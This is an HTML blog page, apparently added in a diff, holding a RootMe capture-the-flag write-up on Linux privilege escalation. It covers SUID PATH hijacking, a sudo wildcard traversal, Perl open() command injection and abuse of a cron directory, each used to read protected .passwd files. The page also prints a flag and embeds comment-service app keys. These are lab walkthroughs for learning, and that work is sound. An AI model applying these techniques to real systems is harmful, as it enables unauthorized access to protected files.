@@ -1,0 +1,1003 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title itemprop="name">RootMe-writeup | 0xGeekCat</title>
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="/css/font.css" media="all">
+  <link rel="stylesheet" href="/css/insight.css" media="all">
+  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "Mаксим0xGeekCat";
+  mashiro_option.author_name = "0xGeekCat";
+  mashiro_option.site_url = "https://0xgeekcat.github.io/";
+  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
+  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
+  mashiro_option.mathjax = "0";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+  <script type="text/javascript">
+  var bg = "https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com%20ls%20black_hair%20f%20toriki%20touhou.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com-293503-ghostblade-long_hair-red_hair-sword-tagme_character-thighhighs-weapon-wlop-scaled.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com-298784-aeolian_wlop-barefoot-black_hair-braids-ghostblade-headdress-long_hair-ponytail-wlop-scaled.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com%20-%20227403%20black_hair%20ghostblade%20jade_(wlop)%20japanese_clothes%20kimono%20logo%20realistic%20short_hair%20tattoo%20umbrella%20wlop.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com-281267-aeolian_wlop-black_hair-bow_weapon-close-ghostblade-green_eyes-logo-long_hair-realistic-watermark-weapon-wink-wlop-scaled.jpg".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+  </style>
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop filter-dim">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="https://0xgeekcat.github.io/">
+          <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/custom/avatar.jpg">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>用来记录我大学最后生涯破釜沉舟力挽狂澜的疯狂学习历程</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="https://github.com/0xGeekCat" target="_blank" class="social-github" title="github">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/social/github.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=1292881925@qq.com" target="_blank" class="social-github" title="email">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/social/email.svg">
+                  </a>
+                </li>
+              
+            
+              
+                <li class="wechat">
+                  <a href="/#">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/social/wechat.png">
+                  </a>
+                  <div class="wechatInner">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/custom/wechat.jpg">
+                  </div>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  <div id="video-container" style="">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu">
+    </div>
+  </div>
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">Mаксим</span>
+            <span class="shironeko">0xGeekCat</span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+                    归档
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/categories/%E6%8A%80%E6%9C%AF/">
+                          <i class="fa fa-code" aria-hidden="true"></i>
+                          技术
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/%E7%94%9F%E6%B4%BB/">
+                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                          生活
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/%E8%BD%AC%E8%BD%BD/">
+                          <i class="fa fa-book" aria-hidden="true"></i>
+                          转载
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    书单
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/tags/%E5%B7%B2%E8%AF%BB/">
+                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                          已读
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/tags/%E6%9C%AA%E8%AF%BB/">
+                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                          未读
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+                    关于
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/about/">
+                          <i class="fa fa-meetup" aria-hidden="true"></i>
+                          我？
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/BuuCTF.png);" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/BuuCTF.png">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      RootMe-writeup</h1>
+      <p class="entry-census">
+        <span>
+          <a href="https://0xgeekcat.github.io/">
+            <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/custom/avatar.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="https://0xgeekcat.github.io/">0xGeekCat</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2020-8-9<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <h1 id="Bash-System-1"><a href="#Bash-System-1" class="headerlink" title="Bash - System 1"></a>Bash - System 1</h1><h2 id="What-are-SUID-privileged-programs"><a href="#What-are-SUID-privileged-programs" class="headerlink" title="What are SUID privileged programs"></a>What are SUID privileged programs</h2><ul>
+<li>The concept of effective uid and real uid.</li>
+<li>For <strong>non Set-UID programs</strong>, the effective uid and the real uid are the same.</li>
+<li>For <strong>Set-UID programs</strong>, the effective uid is the owner of the program, while the real uid is the user of the program.</li>
+</ul>
+<p>Normally, UNIX scripts and programs run with the same permissions as the user who executes them.</p>
+<p>SUID programs, however, override normal permissions and always run with the permissions of the program’s owner.</p>
+<p>The <code>/usr/bin/</code>passwd command is SUID and is owned by root. It always runs with the same permissions as root.</p>
+<pre><code class="sh">$ ls -l /usr/bin/passwd
+-rwsr-xr-x 1 root root 63944 Jul 16  2019 /usr/bin/passwd</code></pre>
+<h2 id="How-to-turn-on-the-Set-UID-bit"><a href="#How-to-turn-on-the-Set-UID-bit" class="headerlink" title="How to turn on the Set-UID bit"></a>How to turn on the Set-UID bit</h2><pre><code class="shell">$ chmod 4777 file -&gt; -rwsr-xr-x </code></pre>
+<h2 id="What-does-the-‘s’-amp-‘t’-in-file-permissions-mean"><a href="#What-does-the-‘s’-amp-‘t’-in-file-permissions-mean" class="headerlink" title="What does the ‘s’ &amp; ‘t’ in file permissions mean"></a>What does the ‘s’ &amp; ‘t’ in file permissions mean</h2><p>之前的两个例子中，如果仔细观察，不难发现<code>s</code>，它表示当前为SUID或者SGID特权程序；如果发现是大写<code>S</code>则说明s权限未生效；之前例子中出现的<code>4</code>就为<code>s</code>权限的数字表示，且位于特殊位</p>
+<p><code>t</code>在接下来的题中会出现，它一般针对权限是<code>777</code>的文件夹，如果文件设置了<code>t</code>权限则只有属主和root有删除文件的权限；linux存放临时文件夹的tmp目录就是<code>t</code>权限</p>
+<pre><code class="sh">开启权限
+$chmod 1777 file -&gt; drwxrwxrwt
+
+关闭权限
+$chmod 1777 file -&gt; drwxrwxrwx</code></pre>
+<h2 id="What-are-PATH-Environment-Variables"><a href="#What-are-PATH-Environment-Variables" class="headerlink" title="What are PATH Environment Variables"></a>What are PATH Environment Variables</h2><p>When running a command in a shell, the shell searches for the command using the PATH environment variable, which consists of a list of directories. </p>
+<p>The shell program searches through this list of directories in the same order as they are specified in the PATH environment variable. </p>
+<p><strong>The first program that matches with the name of the command will be executed.</strong></p>
+<p>What would happen in the following? Note that <code>system (const char *cmd)</code> library function first invoke the <code>/bin/sh</code> program, and then let the shell program execute cmd.</p>
+<pre><code class="sh">system (&quot;mail&quot;);</code></pre>
+<p>The attacker can change PATH to the following, and cause “mail” in the current directory to be executed.</p>
+<pre><code>export PATH=.:$PATH</code></pre>
+<p><code>.:$PATH</code>表示在将当前文件夹加入到之前的PATH环境变量中，最后使用<code>EXPORT</code>进行设置</p>
+<h2 id="Start-the-game"><a href="#Start-the-game" class="headerlink" title="Start the game"></a>Start the game</h2><p><strong>查看当前路径</strong></p>
+<pre><code class="sh">app-script-ch11@challenge02:~$ pwd
+/challenge/app-script/ch11</code></pre>
+<p><strong>查看当前目录</strong></p>
+<pre><code class="sh">app-script-ch11@challenge02:~$ ll
+total 28
+dr-xr-x---  2 app-script-ch11-cracked app-script-ch11 4096 May 19  2019 ./
+drwxr-xr-x 17 root                    root            4096 Mar 19 20:19 ../
+-r--------  1 app-script-ch11-cracked app-script-ch11   14 Feb  8  2012 .passwd
+-r--r-----  1 app-script-ch11-cracked app-script-ch11  494 May 19  2019 Makefile
+-r-sr-x---  1 app-script-ch11-cracked app-script-ch11 7252 May 19  2019 ch11*
+-r--r-----  1 app-script-ch11-cracked app-script-ch11  187 May 19  2019 ch11.c</code></pre>
+<p>ch11文件为SUID特权文件以及.passwd敏感文件</p>
+<p><strong>查看ch11文件</strong></p>
+<pre><code class="sh">app-script-ch11@challenge02:~$ cat ch11.c
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(void)
+&#123;
+    setreuid(geteuid(), geteuid());
+    system(&quot;ls /challenge/app-script/ch11/.passwd&quot;);
+    return 0;
+&#125;</code></pre>
+<p><code>system(&quot;ls /challenge/app-script/ch11/.passwd&quot;);</code>可以实现对ch11文件的操作，但应该为<code>cat</code>命令才能实现读取文件，若将<code>cat</code>命令名更改为<code>ls</code>即可实现绕过</p>
+<p><strong>查看PATH环境变量</strong></p>
+<pre><code class="sh">app-script-ch11@challenge02:/usr/local/bin$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/opt/tools/checksec/</code></pre>
+<p><strong>查找cat和ls命令</strong></p>
+<pre><code class="sh">app-script-ch11@challenge02:~$ ll /bin | grep -w &quot;ls&quot;
+-rwxr-xr-x  1 root root  145144 Jan 18  2018 ls*
+app-script-ch11@challenge02:~$ ll /bin | grep -w &quot;cat&quot;
+-rwxr-xr-x  1 root root   38420 Jan 18  2018 cat*</code></pre>
+<p>二者都存在与<code>/bin</code>目录下</p>
+<p><strong>将cat命令复制到/tmp</strong></p>
+<pre><code class="sh">app-script-ch11@challenge02:/tmp$ cp /bin/cat .</code></pre>
+<p><code>/tmp</code>此时权限如下，没有读权限；可以在<code>/tmp</code>内新建文件夹并在其中进行操作更为明了</p>
+<pre><code class="sh">drwxrwx-wt  42 root root 2166784 May 12 17:36 tmp/</code></pre>
+<p><strong>将cat命令更名为ls</strong></p>
+<pre><code class="sh">app-script-ch11@challenge02:/tmp$ mv cat ls</code></pre>
+<p><strong>修改环境变量</strong></p>
+<pre><code class="sh">app-script-ch11@challenge02:/tmp$ export PATH=.:$PATH</code></pre>
+<p><strong>利用ch11读取.passwd</strong></p>
+<pre><code class="sh">app-script-ch11@challenge02:/tmp$ ~/ch11</code></pre>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><strong>Dangers of SUID Shell Scripts</strong></p>
+<p><strong>SUID Privileged Programs</strong></p>
+<h1 id="sudo-weak-configuration"><a href="#sudo-weak-configuration" class="headerlink" title="sudo - weak configuration"></a>sudo - weak configuration</h1><h2 id="What-is-sudo"><a href="#What-is-sudo" class="headerlink" title="What is sudo"></a>What is sudo</h2><ul>
+<li>Allows delegation of specific root privileges</li>
+<li>Allows users to run specific commands as a different user</li>
+</ul>
+<h2 id="Run-a-Command-as-Another-User"><a href="#Run-a-Command-as-Another-User" class="headerlink" title="Run a Command as Another User"></a>Run a Command as Another User</h2><ul>
+<li>Use the -u flag<br><code>$ sudo -u &lt;username&gt;</code></li>
+<li><strong>Enter your password</strong>, not the root password</li>
+</ul>
+<h2 id="Sudo-Policy-Format"><a href="#Sudo-Policy-Format" class="headerlink" title="Sudo Policy Format"></a>Sudo Policy Format</h2><p><strong>The complex stuff is in /etc/sudoers</strong></p>
+<pre><code class="sh">User Host=(RunAs) Command</code></pre>
+<ul>
+<li>User = who can do this</li>
+<li>Host = which host this applies to </li>
+<li>RunAs = target user (optional) </li>
+<li>Command = the privileged command</li>
+</ul>
+<h2 id="Default-Sudo-Policy"><a href="#Default-Sudo-Policy" class="headerlink" title="Default Sudo Policy"></a>Default Sudo Policy</h2><pre><code class="sh">%wheel ALL = ALL</code></pre>
+<p>If you’re in the <code>wheel</code> group, you get total access.</p>
+<h2 id="Testing-sudoers"><a href="#Testing-sudoers" class="headerlink" title="Testing sudoers"></a>Testing sudoers</h2><p><strong>What access do I have</strong></p>
+<pre><code class="sh">$ sudo -l</code></pre>
+<p><strong>What access do other users have</strong></p>
+<pre><code class="sh">$ sudo -U &lt;username&gt; -l</code></pre>
+<h2 id="How-to-add-a-user-into-Sudo"><a href="#How-to-add-a-user-into-Sudo" class="headerlink" title="How to add a user into Sudo"></a>How to add a user into Sudo</h2><pre><code class="sh">usermod -a -G wheel/sudo &lt;username&gt;</code></pre>
+<p>如果<code>/etc/sudoers</code>中没有sudo组，可以将你的用户指向wheel用户组, wheel用户组同样有sudo权限</p>
+<h2 id="Start-the-game-1"><a href="#Start-the-game-1" class="headerlink" title="Start the game"></a>Start the game</h2><p><strong>查看readme</strong></p>
+<pre><code class="sh">app-script-ch1@challenge02:~$ cat readme.md
+Vous devez réussir à lire le fichier .passwd situé dans le chemin suivant :
+/challenge/app-script/ch1/ch1cracked/
+
+You have to read the .passwd located in the following PATH :
+/challenge/app-script/ch1/ch1cracked/</code></pre>
+<p>当前用户<code>app-script-ch1</code>对<code>ch1cracked</code>文件夹不具有读操作</p>
+<p><strong>查看当前目录</strong></p>
+<pre><code class="sh">app-script-ch1@challenge02:~$ pwd
+/challenge/app-script/ch1</code></pre>
+<p><strong>查看当前用户访问权限</strong></p>
+<pre><code class="sh">app-script-ch1@challenge02:~/ch1cracked$ sudo -l
+[sudo] password for app-script-ch1:
+Matching Defaults entries for app-script-ch1 on challenge02:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms, !mail_no_user
+
+User app-script-ch1 may run the following commands on challenge02:
+    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*</code></pre>
+<p><font color="#dd0000">*匹配所有字符</font></p>
+<p><strong>利用用户app-script-ch1-cracked进行访问</strong></p>
+<pre><code class="sh">app-script-ch1@challenge02:~/ch1cracked$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd</code></pre>
+<h2 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h2><p><strong>sudo you are doing it wrong</strong></p>
+<h1 id="Bash-System-2"><a href="#Bash-System-2" class="headerlink" title="Bash - System 2"></a>Bash - System 2</h1><h2 id="Start-the-game-2"><a href="#Start-the-game-2" class="headerlink" title="Start the game"></a>Start the game</h2><p><strong>查看ch12文件</strong></p>
+<pre><code class="sh">app-script-ch12@challenge02:~$ cat ch12.c
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+int main()&#123;
+    setreuid(geteuid(), geteuid());
+    system(&quot;ls -lA /challenge/app-script/ch12/.passwd&quot;);
+    return 0;
+&#125;</code></pre>
+<p><strong>创建/tmp/hacker</strong></p>
+<pre><code class="sh">app-script-ch12@challenge02:~$ cd /tmp/
+app-script-ch12@challenge02:/tmp$ mkdir hacker</code></pre>
+<p><strong>生成ls.c &amp; 编译成ls</strong></p>
+<pre><code class="sh">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+
+int main()&#123;
+        system(&quot;cat /challenge/app-script/ch12/.passwd&quot;);
+        return 0;
+&#125;</code></pre>
+<p><font color="#dd0000"><code>system()</code>中的参数要用双引号包裹</font></p>
+<pre><code class="sh">app-script-ch12@challenge02:/tmp/hacker$ gcc -o ls ls.c</code></pre>
+<p><strong>修改环境变量 &amp; 执行ch12文件</strong></p>
+<pre><code class="sh">app-script-ch12@challenge02:/tmp/hacker$ export PATH=.:$PATH
+app-script-ch12@challenge02:/tmp/hacker$ ~/ch12</code></pre>
+<h2 id="Reference-2"><a href="#Reference-2" class="headerlink" title="Reference"></a>Reference</h2><p><strong>(Null)</strong></p>
+<h1 id="Perl-Command-injection"><a href="#Perl-Command-injection" class="headerlink" title="Perl - Command injection"></a>Perl - Command injection</h1><h2 id="The-security-issues-about-open"><a href="#The-security-issues-about-open" class="headerlink" title="The security issues about open()"></a>The security issues about <code>open()</code></h2><p>The open() function in Perl is used to open files. In its most common form, it is used in the following way:</p>
+<pre><code class="perl">open (FILEHANDLE, &quot;filename&quot;);</code></pre>
+<p><strong>If the filename begins with “|”, the filename is interpreted as a command to which output is to be piped</strong></p>
+<pre><code class="perl">open (FILEHANDLE, &quot;| filename&quot;);</code></pre>
+<h2 id="Start-the-game-3"><a href="#Start-the-game-3" class="headerlink" title="Start the game"></a>Start the game</h2><pre><code class="sh">app-script-ch7@challenge02:~$ ./setuid-wrapper
+*************************
+* Stat File Service    *
+*************************
+&gt;&gt;&gt; | cat .passwd
+PerlCanDoBetterThanYouThink
+~~~ Statistics for &quot;| cat .passwd&quot; ~~~
+Lines: 0
+Words: 0
+Chars: 0</code></pre>
+<h2 id="Reference-3"><a href="#Reference-3" class="headerlink" title="Reference"></a>Reference</h2><p><strong>Security Issues in Perl Scripts</strong></p>
+<h1 id="Bash-cron"><a href="#Bash-cron" class="headerlink" title="Bash - cron"></a>Bash - cron</h1><h2 id="Linux-Symbolic-Link"><a href="#Linux-Symbolic-Link" class="headerlink" title="Linux Symbolic Link"></a>Linux Symbolic Link</h2><p>Linux有两种链接</p>
+<ul>
+<li>硬链接</li>
+<li>符号链接(软链接)</li>
+</ul>
+<p>软链接文件类似于Windows的快捷方式</p>
+<pre><code class="sh"># cron.d为软链接文件，其指向/tmp/._cron/
+cron.d -&gt; /tmp/._cron/ </code></pre>
+<h2 id="How-do-0-and-0-work"><a href="#How-do-0-and-0-work" class="headerlink" title="How do ${0##*/} and ${0%/*} work?"></a>How do <code>$&#123;0##*/&#125;</code> and <code>$&#123;0%/*&#125;</code> work?</h2><ul>
+<li><p><code>$&#123;0##*/&#125;</code></p>
+<p>for the variable <code>$0</code>, and the pattern <code>/</code>, the two <code>#</code> mean from the beginning of the parameter, delete the longest match and including the pattern</p>
+</li>
+<li><p><code>$&#123;0%/*&#125;</code></p>
+<p>the pattern <code>/</code> is matched against the end of parameter <code>%</code>, with the shortest match deleted </p>
+</li>
+</ul>
+<pre><code class="sh">$0 = $HOME/documents/doc.txt
+$&#123;0##*/&#125; -&gt; doc.txt
+$&#123;0%/*&#125; -&gt; $HOME/documents</code></pre>
+<h2 id="What-is-the-meaning-of-0"><a href="#What-is-the-meaning-of-0" class="headerlink" title="What is the meaning of $0?"></a>What is the meaning of <code>$0</code>?</h2><p><code>$0</code>表示要执行的shell脚本名称</p>
+<h2 id="What-is-the-meaning-of-f-a-x-in-bash-if-statement"><a href="#What-is-the-meaning-of-f-a-x-in-bash-if-statement" class="headerlink" title="What is the meaning of -f -a -x in bash if statement"></a>What is the meaning of <code>-f -a -x</code> in bash <code>if</code> statement</h2><ul>
+<li><p><code>-f</code></p>
+<p>当file存在并且是正规文件时返回真</p>
+</li>
+<li><p><code>-a</code></p>
+<p>&amp;&amp;</p>
+</li>
+<li><p><code>-x</code></p>
+<p>当file可执行时返回真</p>
+</li>
+</ul>
+<h2 id="Start-the-game-4"><a href="#Start-the-game-4" class="headerlink" title="Start the game"></a>Start the game</h2><p><strong>查看当前目录</strong></p>
+<pre><code class="sh">app-script-ch4@challenge02:~$ ll
+total 16
+dr-xr-x---  2 app-script-ch4-cracked app-script-ch4         4096 Jul  1  2017 ./
+drwxr-xr-x 17 root                   root                   4096 Mar 19 20:19 ../
+-r-xr-x---  1 app-script-ch4-cracked app-script-ch4          767 Jul  2  2017 ch4*
+lrwxrwxrwx  1 app-script-ch4         app-script-ch4           11 May 25  2015 cron.d -&gt; /tmp/._cron/
+-r--r-----  1 app-script-ch4-cracked app-script-ch4-cracked   16 Jun  1  2013 .passwd</code></pre>
+<p><strong>查看ch4文件</strong></p>
+<pre><code class="sh">#!/bin/bash
+
+# Sortie de la commande &#39;crontab -l&#39; exécutée en tant que app-script-ch4-cracked:
+# */1 * * * * /challenge/app-script/ch4/ch4
+# Vous N&#39;avez PAS à modifier la crontab(chattr +i t&#39;façons)
+
+# Output of the command &#39;crontab -l&#39; run as app-script-ch4-cracked:
+# */1 * * * * /challenge/app-script/ch4/ch4
+# You do NOT need to edit the crontab (it&#39;s chattr +i anyway)
+
+# hiding stdout/stderr
+exec 1&gt;/dev/null 2&gt;&amp;1
+
+wdir=&quot;cron.d/&quot;
+challdir=$&#123;0%/*&#125;
+cd &quot;$challdir&quot;
+
+
+if [ ! -e &quot;/tmp/._cron&quot; ]; then
+    mkdir -m 733 &quot;/tmp/._cron&quot;
+fi
+
+ls -1a &quot;$&#123;wdir&#125;&quot; | while read task; do
+    if [ -f &quot;$&#123;wdir&#125;$&#123;task&#125;&quot; -a -x &quot;$&#123;wdir&#125;$&#123;task&#125;&quot; ]; then
+        timelimit -q -s9 -S9 -t 5 bash -p &quot;$&#123;PWD&#125;/$&#123;wdir&#125;$&#123;task&#125;&quot;
+    fi
+    rm -f &quot;$&#123;PWD&#125;/$&#123;wdir&#125;$&#123;task&#125;&quot;
+done
+
+rm -rf cron.d/*</code></pre>
+<p><strong>审计ch4文件</strong></p>
+<p>Linux定时任务每隔一分钟执行一次ch4文件，ch4文件会执行<code>cron.d/</code>下的可执行文件之后便删除<code>cron.d/</code></p>
+<p><strong>编写解题脚本</strong></p>
+<pre><code class="sh">app-script-ch4@challenge02:~$ vim cron.d/1.sh
+#!/bin/bash
+if [ ! -e &quot;/tmp/ch4&quot; ]; then
+    mkdir -m 777 &quot;/tmp/ch4&quot;
+fi
+/bin/cat /challenge/app-script/ch4/.passwd &gt; /tmp/ch4/result.txt</code></pre>
+<p><strong>设置脚本权限</strong></p>
+<pre><code class="sh">app-script-ch4@challenge02:~$ crontab -l
+You (app-script-ch4) are not allowed to use this program (crontab)
+See crontab(1) for more information</code></pre>
+<p><strong>Output of the command ‘crontab -l’ run as app-script-ch4-cracked</strong></p>
+<p>由以上输出再结合题目提示得知，执行定时任务的用户为<code>app-script-ch4-cracked</code></p>
+<pre><code class="sh">app-script-ch4@challenge02:~$ chmod 777 cron.d/1.sh</code></pre>
+<p><strong>查看.passwd文件</strong></p>
+<pre><code class="sh">app-script-ch4@challenge02:~$ cat /tmp/ch4/result.txt</code></pre>
+<h2 id="Reference-4"><a href="#Reference-4" class="headerlink" title="Reference"></a>Reference</h2><p><strong>(Null)</strong></p>
